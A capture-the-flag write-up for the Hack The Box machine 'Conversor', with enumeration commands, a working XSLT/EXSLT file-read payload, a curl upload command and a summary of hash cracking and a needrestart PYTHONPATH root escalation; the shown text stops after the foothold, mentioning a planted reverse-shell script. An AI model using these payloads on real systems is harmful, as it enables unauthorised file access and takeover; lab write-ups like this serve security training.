HTB — Conversor
OS	Difficulty	Points	Season	Released
Linux	Easy	20	HTB Season 9	2025-10-25
Skills demonstrated: web exploitation (XSLT/EXSLT injection), offline hash cracking, Linux privilege escalation via PYTHONPATH hijack (CVE-2024-48990).

Summary:
Conversor runs a currency-converter web app whose /convert endpoint applies user-supplied XSLT with EXSLT extensions enabled, giving arbitrary file read and write as www-data. 
Reading the application's SQLite database yields an MD5 password hash that cracks against rockyou. Those credentials log in over SSH as fismathack. 
A NOPASSWD sudo rule for /usr/sbin/needrestart (version 3.7) is then abused through CVE-2024-48990: running a Python process under an attacker-controlled PYTHONPATH causes needrestart's interpreter scan to import a malicious module as root, 
producing a SUID root shell.

Attack chain:
Foothold: XSLT/EXSLT injection on /convert → file read/write as www-data
User: extract MD5 hash from users.db → crack → SSH as fismathack
Root: sudo needrestart + PYTHONPATH module hijack (CVE-2024-48990) → SUID root shell

Tools:
nmap, dirb / gobuster, curl, Burp Suite (session handling), hashcat, custom XSLT payloads.

Enumeration:
bash
echo "10.10.11.XX conversor.htb" | sudo tee -a /etc/hosts
nmap -sC -sV -p- 10.10.11.XX
# 22/tcp  open  ssh
# 80/tcp  open  http   Apache
dirb http://conversor.htb/ /usr/share/wordlists/dirbuster/big.txt
# /convert  (POST: XML + XSLT upload)
Foothold — XSLT / EXSLT injection
The /convert endpoint (authenticated) processes user-supplied XSLT with EXSLT extensions enabled. exsl:document writes to arbitrary paths, and document() reads arbitrary files. 
This is XSLT injection via unsafe lxml.etree.XSLT, distinct from classic XXE: the primitive is the stylesheet's own functions, not external-entity expansion.

File-read stylesheet (read.xslt):
xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/tmp/db.dump" method="text">
      <xsl:copy-of select="document('/var/www/conversor.htb/instance/users.db')"/>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
Upload with a valid session cookie:
bash
curl -X POST http://conversor.htb/convert \
  -F "xml_file=@sample.xml" \
  -F "xslt_file=@read.xslt" \
  -b "session=<SESSION_COOKIE>"
The dumped SQLite database contained an MD5 password hash.
Alternative foothold (direct shell): the same exsl:document write primitive dropped a reverse-shell script into /var/www/conversor.htb/scripts/, which a cron job reportedly runs every 60 seconds as www-data.
Confirm the cron entry's existence and interval on the box before relying on this path; it is stated here as observed, not verified against the crontab.
